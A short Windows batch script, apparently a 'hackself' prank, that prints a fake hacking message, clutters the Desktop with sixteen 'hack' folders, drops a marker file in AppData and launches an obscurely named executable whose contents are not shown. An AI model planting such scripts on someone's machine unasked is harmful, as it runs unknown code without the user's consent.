@echo off
set loc=%cd%
if "%1"=="-a" goto hack
echo Type: hackself -a TO CONTINUE
goto cmd
:hack
echo Hacking self..
cd %appdata%
if exist "hackskip" goto hacknodesk
cd %USERPROFILE%
if not exist "Desktop" echo Desktop does not exist. Run this command again.. && pause && cd %appdata% && echo > hackskip && cd %loc% && goto cmd
cd Desktop
mkdir hack-1
mkdir hack-2
mkdir hack-3
mkdir hack-4
mkdir hack-5
mkdir hack-6
mkdir hack-7
mkdir hack-8
mkdir hack-9
mkdir hack-10
mkdir hack-11
mkdir hack-12
mkdir hack-13
mkdir hack-14
mkdir hack-15
mkdir hack-16
:hacknodesk
cd %loc%
start wdizwduiwdkjwdkzuiwdzukidwz.exe
cd %loc%

:cmd
cd "%loc%"